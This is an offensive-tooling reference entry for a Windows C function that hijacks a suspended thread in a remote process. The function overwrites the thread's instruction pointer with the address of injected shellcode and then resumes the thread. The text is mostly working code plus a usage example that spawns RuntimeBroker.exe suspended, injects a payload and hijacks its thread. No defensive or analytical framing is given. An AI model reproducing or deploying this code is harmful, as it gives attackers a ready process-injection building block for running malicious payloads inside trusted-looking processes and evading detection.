## Remote Thread Hijacking via SetThreadContext

Hijacks a suspended thread in a remote process to redirect execution to an already-injected payload. Retrieves the thread's `CONTEXT` structure with `GetThreadContext`, overwrites the instruction pointer register (`RIP` on x64) with the payload's remote base address, applies the modified context back with `SetThreadContext`, resumes the thread with `ResumeThread`, and waits for it to finish with `WaitForSingleObject`.

**Usage**

Call `HijackThread` with the suspended thread handle returned by `CreateSuspendedProcess` and the remote payload address returned by `InjectShellcodeToRemoteProcess`. The payload must already be written and marked executable in the remote process before this call.

- `IN HANDLE hThread`  Handle to the suspended thread to hijack.
- `IN PVOID pAddress`  Base address of the payload in the remote process's address space.

**Return Value**

`BOOL`  Returns `TRUE` if the thread context was successfully updated and the thread was resumed, otherwise `FALSE`.

- `windows.h`  `BOOL`, `HANDLE`, `PVOID`, `CONTEXT`, `CONTEXT_CONTROL`, `IN`, `GetThreadContext()`, `SetThreadContext()`, `ResumeThread()`, `WaitForSingleObject()`, `GetLastError()`

### Code

```c
#include <windows.h>
#include <stdio.h>


BOOL HijackThread(IN HANDLE hThread, IN PVOID pAddress) {

    CONTEXT ThreadCtx = {
        .ContextFlags = CONTEXT_CONTROL     // Required for GetThreadContext to populate RIP/EIP.
    };

    // Retrieve the suspended thread's context.
    if (!GetThreadContext(hThread, &ThreadCtx)) {
        printf("\n\t[!] GetThreadContext Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    // Overwrite the instruction pointer with the remote payload's base address.
    // When the thread resumes, execution will begin at the payload.
    ThreadCtx.Rip = (DWORD_PTR)pAddress;

    // Apply the modified context back to the suspended thread.
    if (!SetThreadContext(hThread, &ThreadCtx)) {
        printf("\n\t[!] SetThreadContext Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    // Resume the suspended thread to trigger payload execution.
    ResumeThread(hThread);

    // Wait for the hijacked thread to finish execution.
    WaitForSingleObject(hThread, INFINITE);

    return TRUE;
}
```

**Example**

```c
HANDLE  hProcess    = NULL,
        hThread     = NULL;
DWORD   dwProcessId = NULL;
PVOID   pAddress    = NULL;

// Step 1: Create the target process suspended.
CreateSuspendedProcess2(L"RuntimeBroker.exe", &dwProcessId, &hProcess, &hThread);

// Step 2: Write + protect the payload in the remote process.
InjectShellcodeToRemoteProcess(hProcess, pPayload, sPayloadSize, &pAddress);

// Step 3: Repoint the suspended thread's RIP at the payload, resume, and wait.
HijackThread(hThread, pAddress);

CloseHandle(hProcess);
CloseHandle(hThread);
```
